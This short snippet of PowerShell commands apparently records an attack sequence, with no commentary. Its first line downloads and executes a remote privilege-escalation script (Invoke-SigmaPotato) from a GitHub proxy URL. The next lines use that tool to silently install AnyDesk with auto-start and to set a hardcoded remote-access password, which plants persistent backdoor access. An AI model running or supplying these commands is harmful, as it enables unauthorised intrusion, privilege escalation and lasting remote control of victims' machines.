...
iex(new-object net.webclient).downloadstring('https://gh-proxy.org/https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "e:\fin\anyd.exe --install C:\programdata\aaa --start-with-win --silent"
Invoke-SigmaPotato -command "cmd /c echo Sqopis@123 | C:\programdata\aaa\anydesk.exe --set-password"